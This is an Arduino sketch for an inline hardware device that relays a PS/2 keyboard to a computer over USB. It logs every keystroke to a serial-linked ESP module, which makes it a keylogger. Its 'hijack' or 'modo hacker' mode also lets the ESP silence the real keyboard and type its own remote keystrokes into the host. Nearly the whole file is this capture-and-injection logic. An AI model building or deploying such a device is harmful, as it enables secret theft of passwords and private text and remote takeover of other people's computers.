#include <PS2KeyAdvanced.h>
#include <string.h>
#include <Keyboard.h>
#include <SoftwareSerial.h>

PS2KeyAdvanced teclado;

#define DATAPIN 4
#define IRQPIN  3

#define PRESS true
#define RELEASE false

#define RX 8
#define TX 9

bool shiftKey = false;
bool ctrlKey = false;
bool altKey = false;
bool capsLockKey = false;
bool winKey = false;
String retorno;
bool numLockKey = false;

SoftwareSerial serialESP (RX, TX);

bool hijackMode = false;

uint16_t vetorF[] = {KEY_F1, KEY_F2, KEY_F3 , KEY_F4, KEY_F5, KEY_F6, KEY_F7, KEY_F8, KEY_F9, KEY_F10, KEY_F11, KEY_F12};

uint16_t vetorTecEsp[] = {KEY_TAB, KEY_CAPS_LOCK, KEY_LEFT_CTRL, KEY_LEFT_ALT, KEY_LEFT_GUI, KEY_NUM_LOCK, ' ',
KEY_ESC, KEY_RETURN, KEY_BACKSPACE, KEY_ESC, KEY_F1, KEY_F2, KEY_F3 , KEY_F4, KEY_F5, KEY_F6, KEY_F7, KEY_F8, KEY_F9, KEY_F10, KEY_F11, KEY_F12};

String vetorString[] = {"Tab", "Caps_lock", "Ctrl", "Alt", "Windows", "Num_lock", "Space_key", "Esc", "Enter",
"Backspace", "Delete", "F1", "F2", "F3" , "F4", "F5", "F6", "F7", "F8", "F9", "F10", "F11", "F12"};

String aux = "";
String aux2 = "";
String pressStr = "p;;";
String releaseStr = "r;;";

void teclar(uint16_t key, bool pressionar);
void teclarMais(uint16_t key, bool pressionar);
void lerAgenda();
bool pressHandler(String aux);
bool verificarTeclas(String str);
String modoHacker(String str);


void setup() {
  teclado.begin(DATAPIN, IRQPIN);
  serialESP.begin(9600);
  Serial.begin(9600);
  Serial.println("Serial iniciada!");
}

void loop() {
  // está como on/off, ao invés de toggle
  if (Serial.available() > 0) 
  {
    String texto = Serial.readStringUntil('\n');
    texto.trim();
    if(texto == "hijack on")
    {
      hijackMode = true;
      Keyboard.releaseAll();
    }
    else if (texto == "hijack off")
    {
      hijackMode = false;
      Keyboard.releaseAll();
    }
    else if (texto = "panic")
    {
      Keyboard.releaseAll();
    }
  }

  // put your main code here, to run repeatedly:
  if(teclado.available() && hijackMode == false)
  {
    uint16_t datarecei = teclado.read();
    char tecla = datarecei;
    int reader = datarecei;

    /***************************************************************
                     DETECÇÃO DE TECLAS ESPECIAIS
    ***************************************************************/

    // SHIFT
    if (reader == 16646 || reader == 20742) // shift hold
    {
      if (shiftKey != true)
      {
        shiftKey = true;
        
        serialESP.println("Shift " + pressStr);
        Serial.println("Shift " + pressStr);
        teclar(KEY_LEFT_SHIFT, PRESS);
      }
    }
    else if (reader == 24838 || reader == 18694 || reader == 21254 || reader == 17158 || reader == 28934 || reader == 22790 
    || reader == 30982 || reader == 27398 || reader == 29446) // shift hold without logic (ctrl, alt, etc)
    {
      serialESP.println("Shift " + pressStr);
      Serial.println("Shift " + pressStr);
      teclar(KEY_LEFT_SHIFT, PRESS);
    }
    else if (reader == -32506 || reader == -28410 || reader == -16120 || reader == -30458 || reader == -27898 || reader == -24314 
    || reader == -31994 || reader == -20218 || reader == -26362 || reader == -21754 || reader == -19706) // shift release
    {
      shiftKey = false;
      
      serialESP.println("Shift " + releaseStr);
      Serial.println("Shift " + releaseStr);
      teclar(KEY_LEFT_SHIFT, RELEASE);
    }

    // CAPS LOCK
    else if (reader == 4355 || reader == 12547 || reader == 20739 || reader == 4867 || reader == 6403) // caps lock hold
    {
      capsLockKey = true;
      
      serialESP.println("Caps_lock " + pressStr);
      Serial.println("Caps_lock " + pressStr);
      teclar(KEY_CAPS_LOCK, PRESS);
      teclar(KEY_CAPS_LOCK, RELEASE);
    }
    else if (reader == -32509 || reader == -24317 || reader == -16125 || reader == -31997 || reader == -30461) // caps lock release
    {
      capsLockKey = false;
      
      serialESP.println("Caps_lock " + releaseStr);
      Serial.println("Caps_lock " + releaseStr);
      teclar(KEY_CAPS_LOCK, PRESS);
      teclar(KEY_CAPS_LOCK, RELEASE);
    }

    // CTRL
    else if (reader == 8456 || reader == 24840 || reader == 12552 || reader == 10504 || reader == 13064 || reader == 8968 || reader == 14600) // ctrl hold
    {
      if (ctrlKey != true)
      {
        ctrlKey = true;
        
        serialESP.println("Ctrl " + pressStr);
        Serial.println("Ctrl " + pressStr);
        teclar(KEY_LEFT_CTRL, PRESS);
      }
    }
    else if (reader == -32504 || reader == -16120 || reader == -28408 || reader == -30456 || reader == -27896 || reader == -31992 || reader == -26360) // ctrl release
    {
      ctrlKey = false;
      
      serialESP.println("Ctrl " + releaseStr);
      Serial.println("Ctrl " + releaseStr);
      teclar(KEY_LEFT_CTRL, RELEASE);
    }

    //ALT
    else if (reader == 2314|| reader == 10506 || reader == 18698 || reader == 6410 || reader == 2826 || reader == 14602) // alt hold
    {
      if (altKey != true)
      {
        altKey = true;
        
        serialESP.println("Alt " + pressStr);
        Serial.println("Alt " + pressStr);
        teclar(KEY_LEFT_ALT, PRESS);
      }
    }
    else if (reader ==  -32502|| reader == -24310 || reader == -16118 || reader == -28406 || reader == -31990 || reader == -20214) // alt release
    {
      altKey = false;
      
      serialESP.println("Alt " + releaseStr);
      Serial.println("Alt " + releaseStr);
      teclar(KEY_LEFT_ALT, RELEASE);
    }

    //WINDOWS
    else if (reader == 780 || reader == 2828 || reader == 8972 || reader == 17164 || reader == 4876 || reader == 6924)
    {
      if (winKey != true)
      {
        winKey = true;
        
        serialESP.println("Windows " + pressStr);
        Serial.println("Windows " + pressStr);
        teclar(KEY_LEFT_GUI, PRESS);
      }
    }
    else if (reader == -32500 || reader == -30452 || reader == -24308 || reader == -16116 || reader == -28404 || reader == -26356)
    {
      winKey = false;
      
      serialESP.println("Windows " + releaseStr);
      Serial.println("Windows " + releaseStr);
      teclar(KEY_LEFT_GUI, RELEASE);
    }

    //NUM LOCK
    else if (reader == 257 || reader == 16641 || reader == 8449 || reader == 4353 || reader == 20737)
    {
      numLockKey = true;
      
      serialESP.println("Num_lock " + releaseStr);
      Serial.println("Num_lock " + releaseStr);
      teclar(KEY_NUM_LOCK, PRESS);
      teclar(KEY_NUM_LOCK, RELEASE);
    }
    else if (reader == -32511 || reader == -16127 || reader == -24319 || reader == -28415 || reader == -12031)
    {
      numLockKey = false;
      
      serialESP.println("Num_lock " + pressStr);
      Serial.println("Num_lock " + pressStr);
      teclar(KEY_NUM_LOCK, PRESS);
      teclar(KEY_NUM_LOCK, RELEASE);
    }

    /***************************************************************
                           TECLAS DE LETRAS
    ***************************************************************/

    else if(shiftKey == capsLockKey && tecla >= 'A' && tecla <= 'Z' && reader > 0 )
    {
      char letra_m = tecla + 32;
      String saida = String(letra_m) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(letra_m, PRESS);
    }
    else if (shiftKey != capsLockKey && tecla >= 'A' && tecla <= 'Z' && reader > 0)
    {
      String saida = String(tecla) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(tecla + 32, PRESS);
    }
    else if(shiftKey == capsLockKey && tecla >= 'A' && tecla <= 'Z' && reader < 0)
    {
      char letra_m = tecla + 32;
      String saida = String(letra_m) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(letra_m, RELEASE);
    }
    else if(shiftKey != capsLockKey && tecla >= 'A' && tecla <= 'Z' && reader < 0)
    {
      String saida = String(tecla) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(tecla + 32, RELEASE);
    }

    // Ç

    else if (reader == 91 || reader == 20571)
    {
      serialESP.println("ç " + pressStr);
      Serial.println("ç " + pressStr);
      teclar(';', PRESS);
    }
    else if (reader == -32677 || reader == -12197)
    {
      serialESP.println("ç " + releaseStr);
      Serial.println("ç " + releaseStr);
      teclar(';', RELEASE);
    }
    else if (reader == 16475 || reader == 4187)
    {
      serialESP.println("Ç " + pressStr);
      Serial.println("Ç " + pressStr);
      teclar(';', PRESS);
    }
    else if (reader == -16293 || reader == -28581)
    {
      serialESP.println("Ç " + releaseStr);
      Serial.println("Ç " + releaseStr);
      teclar(';', RELEASE);
    }

    /***************************************************************
                           TECLAS DE NUMEROS
    ***************************************************************/

    else if(reader >= 48 && reader <= 57)
    {
      String saida = String(tecla) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }
    else if(reader >= -32720 && reader <= -32711)
    {
      String saida = String(tecla) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }

    // CTRL

    else if(reader >= 8240 && reader <= 8249)
    {
      String saida = String(tecla) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }
    else if(reader >= -24528 && reader <= -24519)
    {
      String saida = String(tecla) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }

    // SHIFT

    else if(reader >= 16432 && reader <= 16441)
    {
      String saida = String(tecla) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }
    else if(reader >= -16336 && reader <= -16327)
    {
      String saida = String(tecla) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }

    // CTRL + ALT

    else if(reader >= 10288 && reader <= 10297)
    {
      String saida = String(tecla) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }
    else if(reader >= -22480 && reader <= -22471)
    {
      String saida = String(tecla) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
    }

    /***************************************************************
                          SIMBOLOS
    ***************************************************************/

    // "\"

    else if (reader == 139 || reader == 4235)
    {
      serialESP.println("\\ " + pressStr);
      Serial.println("\\ " + pressStr);
    }
    else if (reader == -32629 || reader == -28533)
    {
      serialESP.println("\\ " + releaseStr);
      Serial.println("\\ " + releaseStr);
    }
    else if (reader == 16523 || reader == 20619)
    {

      serialESP.println("| " + pressStr);
      Serial.println("| " + pressStr);
    }
    else if (reader == -16245 || reader == -12149)
    {
      serialESP.println("| " + releaseStr);
      Serial.println("| " + releaseStr);
    }

    // '

    else if (reader == 64 || reader == 4160)
    {
      serialESP.println("' " + pressStr);
      Serial.println("' " + pressStr);
      teclar(39, PRESS);
    }
    else if (reader == -32704 || reader == -28608)
    {
      serialESP.println("' " + releaseStr);
      Serial.println("' " + releaseStr);
      teclar(39, RELEASE);
    }
    else if (reader == 20544 || reader == 16448)
    {
      serialESP.println("\" " + pressStr);
      Serial.println("\" " + pressStr);
      teclar('~', PRESS);
    }
    else if (reader == -12224 || reader == -16320)
    {
      serialESP.println("\" " + releaseStr);
      Serial.println("\" " + releaseStr);
      teclar('~', RELEASE);
    }

    // -

    else if (reader == 60 || reader == 4156)
    {
      serialESP.println("- " + pressStr);
      Serial.println("- " + pressStr);
      teclar('-', PRESS);
    }
    else if (reader == -32708 || reader == -28612)
    {
      serialESP.println("- " + releaseStr);
      Serial.println("- " + releaseStr);
      teclar('-', RELEASE);
    }
    else if (reader == 20540 || reader == 16444)
    {
      serialESP.println("_ " + pressStr);
      Serial.println("_ " + pressStr);
      teclar('_', PRESS);
    }
    else if (reader == -12228 || reader == -16324)
    {
      serialESP.println("_ " + releaseStr);
      Serial.println("_ " + releaseStr);
      teclar('_', RELEASE);
    }

    // 

    else if (reader == 4191 || reader == 95)
    {
      serialESP.println("= " + pressStr);
      Serial.println("= " + pressStr);
      teclar('=', PRESS);
    }
    else if (reader == -28577 || reader == -32673)
    {
      serialESP.println("= " + releaseStr);
      Serial.println("= " + releaseStr);
      teclar('=', RELEASE);
    }
    else if (reader == 16479 || reader == 20575)
    {
      serialESP.println("+ " + pressStr);
      Serial.println("+ " + pressStr);
      teclar('+', PRESS);
    }
    else if (reader == -16289 || reader == -12193)
    {
      serialESP.println("+ " + releaseStr);
      Serial.println("+ " + releaseStr);
      teclar('+', RELEASE);
    }
    else if (reader == 10335 || reader == 14431)
    {
      serialESP.println("§ " + pressStr);
      Serial.println("§ " + pressStr);
      teclar(42, PRESS); //TODO
    }
    else if (reader == -22433 || reader == -18337)
    {
      serialESP.println("§ " + releaseStr);
      Serial.println("§ " + releaseStr);
      teclar(42, RELEASE); //TODO
    }

    // ´
    else if (reader == 93 || reader == 4189)
    {
      serialESP.println("´ " + pressStr);
      Serial.println("´ " + pressStr);
      teclar('[', PRESS);
    }
    else if (reader == -32675 || reader == -28579)
    {
      serialESP.println("´ " + releaseStr);
      Serial.println("´ " + releaseStr);
      teclar('[', RELEASE);
    }
    else if (reader == 16477 || reader == 20573)
    {
      serialESP.println("` " + pressStr);
      Serial.println("` " + pressStr);
      teclar('{', PRESS);
    }
    else if (reader == -16291 || reader == -12195)
    {
      serialESP.println("` " + releaseStr);
      Serial.println("` " + releaseStr);
      teclar('{', RELEASE);
    }

    //[
    else if (reader == 94 || reader == 4190)
    {
      serialESP.println("[ " + pressStr);
      Serial.println("[ " + pressStr);
      teclar(93, PRESS);
    }
    else if (reader == -32674 || reader == -28578)
    {
      serialESP.println("[ " + releaseStr);
      Serial.println("[ " + releaseStr);
      teclar(93, RELEASE);
    }
    else if (reader == 16478 || reader == 20574)
    {
      serialESP.println("{ " + pressStr);
      Serial.println("{ " + pressStr);
      teclar(200, PRESS);
    }
    else if (reader == -16290 || reader == -12194)
    {
      serialESP.println("{ " + releaseStr);
      Serial.println("{ " + releaseStr);
      teclar(200, RELEASE);
    }
    else if (reader == 10334 || reader == 14430)
    {
      serialESP.println("ª " + pressStr);
      Serial.println("ª " + pressStr);
      teclar('ª', PRESS);
    }
    else if (reader == -22434 || reader == -18338)
    {
      serialESP.println("ª " + releaseStr);
      Serial.println("ª " + releaseStr);
      teclar('ª', RELEASE);
    }

    // ~
    else if (reader == 58 || reader == 4154)
    {
      serialESP.println("~ " + pressStr);
      Serial.println("~ " + pressStr);
      teclar(39, PRESS);
    }
    else if (reader == -32710 || reader == -28614)
    {
      serialESP.println("~ " + releaseStr);
      Serial.println("~ " + releaseStr);
      teclar(39, RELEASE);
    }
    else if (reader == 16442 || reader == 20538)
    {
      serialESP.println("^ " + pressStr);
      Serial.println("^ " + pressStr);
      teclar('"', PRESS);
    }
    else if (reader == -16326 || reader == -12230)
    {
      serialESP.println("^ " + releaseStr);
      Serial.println("^ " + releaseStr);
      teclar('"', RELEASE);
    }

    //]
    else if (reader == 92 || reader == 4188)
    {
      serialESP.println("] " + pressStr);
      Serial.println("] " + pressStr);
      teclar(']', PRESS);
    }
    else if (reader == -32676 || reader == -28580)
    {
      serialESP.println("] " + releaseStr);
      Serial.println("] " + releaseStr);
      teclar(']', RELEASE);
    }
    else if (reader == 16476 || reader == 20572)
    {
      serialESP.println("} " + pressStr);
      Serial.println("} " + pressStr);
      teclar('}', PRESS);
    }
    else if (reader == -16292 || reader == -12196)
    {
      serialESP.println("} " + releaseStr);
      Serial.println("} " + releaseStr);
      teclar('}', RELEASE);
    }
    else if (reader == 10332 || reader == 14428)
    {
      serialESP.println("º " + pressStr);
      Serial.println("º " + pressStr);
      teclar('º', PRESS);
    }
    else if (reader == -22436 || reader == -18340)
    {
      serialESP.println("º " + releaseStr);
      Serial.println("º " + releaseStr);
      teclar('º', RELEASE);
    }

    // ,
    else if (reader == 59 || reader == 4155)
    {
      serialESP.println(", " + pressStr);
      Serial.println(", " + pressStr);
      teclar(',', PRESS);
    }
    else if (reader == -32709 || reader == -28613)
    {
      serialESP.println(", " + releaseStr);
      Serial.println(", " + releaseStr);
      teclar(',', RELEASE);
    }
    else if (reader == 16443 || reader == 20539)
    {
      serialESP.println("< " + pressStr);
      Serial.println("< " + pressStr);
      teclar('<', PRESS);
    }
    else if (reader == -16325 || reader == -12229)
    {
      serialESP.println("< " + releaseStr);
      Serial.println("< " + releaseStr);
      teclar('<', RELEASE);
    }

    // .
    else if (reader == 61 || reader == 4157)
    {
      serialESP.println(". " + pressStr);
      Serial.println(". " + pressStr);
      teclar('.', PRESS);
    }
    else if (reader == -32707 || reader == -28611)
    {
      serialESP.println(". " + releaseStr);
      Serial.println(". " + releaseStr);
      teclar('.', RELEASE);
    }
    else if (reader == 16445 || reader == 20541)
    {
      serialESP.println("> " + pressStr);
      Serial.println("> " + pressStr);
      teclar('>', PRESS);
    }
    else if (reader == -16323 || reader == -12227)
    {
      serialESP.println("> " + releaseStr);
      Serial.println("> " + releaseStr);
      teclar('>', RELEASE);
    }

    // ;
    else if (reader == 62 || reader == 4158)
    {
      serialESP.println("; " + pressStr);
      Serial.println("; " + pressStr);
      teclar(';', PRESS);
    }
    else if (reader == -32706 || reader == -28610)
    {
      serialESP.println("; " + releaseStr);
      Serial.println("; " + releaseStr);
      teclar(';', RELEASE);
    }
    else if (reader == 16446 || reader == 20542)
    {
      serialESP.println(": " + pressStr);
      Serial.println(": " + pressStr);
      teclar(':', PRESS);
    }
    else if (reader == -16322 || reader == -12226)
    {
      serialESP.println(": " + releaseStr);
      Serial.println(": " + releaseStr);
      teclar(':', RELEASE);
    }

    // /
    else if (reader == 401 || reader == 4497)
    {
      serialESP.println("/ " + pressStr);
      Serial.println("/ " + pressStr);
      teclar('/', PRESS);
    }
    else if (reader == -32367 || reader == -28271)
    {
      serialESP.println("/ " + releaseStr);
      Serial.println("/ " + releaseStr);
      teclar('/', RELEASE);
    }
    else if (reader == 16785 || reader == 20881)
    {
      serialESP.println("? " + pressStr);
      Serial.println("? " + pressStr);
      teclar('?', PRESS);
    }
    else if (reader == -15983 || reader == -11887)
    {
      serialESP.println("? " + releaseStr);
      Serial.println("? " + releaseStr);
      teclar('?', RELEASE);
    }
    else if (reader == 10641 || reader == 14737)
    {
      serialESP.println("° " + pressStr);
      Serial.println("° " + pressStr);
      teclar('°', PRESS);
    }
    else if (reader == -22127 || reader == -18031)
    {
      serialESP.println("° " + releaseStr);
      Serial.println("° " + releaseStr);
      teclar('°', RELEASE);
    }

    /***************************************************************
                          f1 a f12
    ***************************************************************/

    // raw

    else if(reader >= 353 && reader <= 364)
    {
      int resultado = reader%352;
      String saida = "F" + String(resultado) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], PRESS);
    }
    else if(reader >= -32415 && reader <= -32404)
    {
      int resultado = (reader%(32403))+13;
      String saida = "F" + String(resultado) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], RELEASE);
    }

    // CTRL

    else if(reader >= 8545 && reader <= 8556)
    {
      int resultado = reader%8544;
      String saida = "F" + String(resultado) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], PRESS);
    }
    else if(reader >= -24223 && reader <= -24212)
    {
      int resultado = (reader%(24211))+13;
      String saida = "F" + String(resultado) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], RELEASE);
    }

    // ALT

    else if(reader >= 2401 && reader <= 2412)
    {
      int resultado = reader%2400;
      String saida = "F" + String(resultado) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], PRESS);
    }
    else if(reader >= -30367 && reader <= -30356)
    {
      int resultado = (reader%(30355))+13;
      String saida = "F" + String(resultado) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], RELEASE);
    }

    // CTRL + ALT

    else if(reader >= 10593 && reader <= 10604)
    {
      int resultado = reader%10592;
      String saida = "F" + String(resultado) + " " + pressStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], PRESS);
    }
    else if(reader >= -22175 && reader <= -22164)
    {
      int resultado = (reader%(22163))+13;
      String saida = "F" + String(resultado) + " " + releaseStr;
      
      serialESP.println(saida);
      Serial.println(saida);
      teclar(vetorF[resultado-1], RELEASE);
    }

    /***************************************************************
                          OUTRAS TECLAS
    ***************************************************************/

    // SPACE

    else if (reader == 287 || reader == 16671 || reader == 4383 || reader == 20767)
    {
      serialESP.println("Space_key " + pressStr);
      Serial.println("Space_key " + pressStr);
      teclar(' ', PRESS);
    }
    else if (reader == -32481 || reader == -16097 || reader == -24289 || reader == -28385)
    {
      serialESP.println("Space_key " + releaseStr);
      Serial.println("Space_key " + releaseStr);
      teclar(' ', RELEASE);
    }

    // TAB

    else if (reader == 285 || reader == 4381 || reader == 16669 || reader == 8477 || reader == 2333)
    {
      serialESP.println("Tab " + pressStr);
      Serial.println("Tab " + pressStr);
      teclar(KEY_TAB, PRESS);
    }
    else if (reader == -32483 || reader == -28387 || reader == -16099 || reader == -24291 || reader == -30435)
    {
      serialESP.println("Tab " + releaseStr);
      Serial.println("Tab " + releaseStr);
      teclar(KEY_TAB, RELEASE);
    }

    // ESC

    else if (reader == 283)
    {
      serialESP.println("Esc " + pressStr);
      Serial.println("Esc " + pressStr);
      teclar(KEY_ESC, PRESS);
    }
    else if (reader == -32485)
    {
      serialESP.println("Esc " + releaseStr);
      Serial.println("Esc " + releaseStr);
      teclar(KEY_ESC, RELEASE);
    }
    
    // ENTER

    else if (reader == 286 || reader == 16670 || reader == 8478)
    {
      serialESP.println("Enter " + pressStr);
      Serial.println("Enter " + pressStr);
      teclar(KEY_RETURN, PRESS);
    }
    else if (reader == -32482 || reader == -16098 || reader == -24290)
    {
      serialESP.println("Enter " + releaseStr);
      Serial.println("Enter " + releaseStr);
      teclar(KEY_RETURN, RELEASE);
    }

    // BACKSPACE

    else if (reader == 284 || reader == 16668 || reader == 8476)
    {
      serialESP.println("Backspace " + pressStr);
      Serial.println("Backspace " + pressStr);
      teclar(KEY_BACKSPACE, PRESS);
    }
    else if (reader == -32484 || reader == -16100 || reader == -24292)
    {
      serialESP.println("Backspace " + releaseStr);
      Serial.println("Backspace " + releaseStr);
      teclar(KEY_BACKSPACE, RELEASE);
    }

    // DELETE

    else if (reader == 282 || reader == 16666 || reader == 8474 || reader == 2330 || reader == 10522)
    {
      serialESP.println("Delete " + pressStr);
      Serial.println("Delete " + pressStr);
      teclar(KEY_DELETE, PRESS);
    }
    else if (reader == -32486 || reader == -16102 || reader == -24294 || reader == -30438 || reader == -22246)
    {
      serialESP.println("Delete " + releaseStr);
      Serial.println("Delete " + releaseStr);
      teclar(KEY_DELETE, RELEASE);
    }

    else if (reader != 250)
    {
      //Serial.println(tecla);
      Serial.println(reader);
    }
  }
  lerAgenda();
}

void teclar(uint16_t key, bool pressionar)
{
  if (hijackMode == false)
  {
    if(pressionar == true) Keyboard.press(key);
    else Keyboard.release(key);
  }
}

void teclarMais(uint16_t key, bool pressionar)
{
  if(pressionar == true) Keyboard.press(key);
  else Keyboard.release(key);
}

void lerAgenda()
{
  if (serialESP.available()) 
  {
    char c = serialESP.read();
    aux.concat(c);

    if (aux.endsWith("\n")) 
    {
      aux = modoHacker(aux);
    }
    else if(aux.endsWith(";;"))
    {
      if (!verificarTeclas(aux))
      {
        Serial.println("Tecla lida: " + aux);
        teclarMais(aux[0], pressHandler(aux));
      }
      aux = "";
    }
  }
}

bool pressHandler(String str)
{
  if (str.endsWith("p;;")) return PRESS;
  else if (str.endsWith("r;;")) return RELEASE;
  else // panic button
  {
    Keyboard.releaseAll();
    return RELEASE;
  }
}

bool verificarTeclas(String str)
{
  for (int i = 0; i < 23; i++)
  {
    if(str.startsWith(vetorString[i]))
    {
      if (i == 1) // caps lock
      {
        Serial.println("Tecla caps lida!");
        teclarMais(KEY_CAPS_LOCK, PRESS);
        teclarMais(KEY_CAPS_LOCK, RELEASE);
        return true;
      }
      else if (i == 5) // num lock
      {
        Serial.println("Tecla num lock lida!");
        teclarMais(KEY_NUM_LOCK, PRESS);
        teclarMais(KEY_NUM_LOCK, RELEASE);
        return true;
      }
      else if (vetorString[i] == "Space_key")
      {
        if (str.endsWith("p;;"))
        {
          Serial.println("Tecla espaço lida!");
          Keyboard.write(' ');
        }
        return true;
      }
      else // outras teclas especiais
      {
        Serial.println("Tecla (especial) lida!");
        teclarMais(vetorTecEsp[i], pressHandler(str));
        return true;
      }
    }
  }
  return false;
}

String modoHacker(String str)
{
  if (str.endsWith("\n"))
  {
    if(str.endsWith("hijack on\n"))
    {
      Serial.println("Modo hacker on!");
      hijackMode = true;
      Keyboard.releaseAll();
      return "";
    }
    else if (str.endsWith("hijack off\n"))
    {
      Serial.println("Modo hacker off!");
      hijackMode = false;
      Keyboard.releaseAll();
      return "";
    }
    else if (str = "panic\n")
    {
      Keyboard.releaseAll();
      return "";
    }
    else
    {
      Serial.println("String finalizada!");
      return "";
    }
  }
  return str;
}
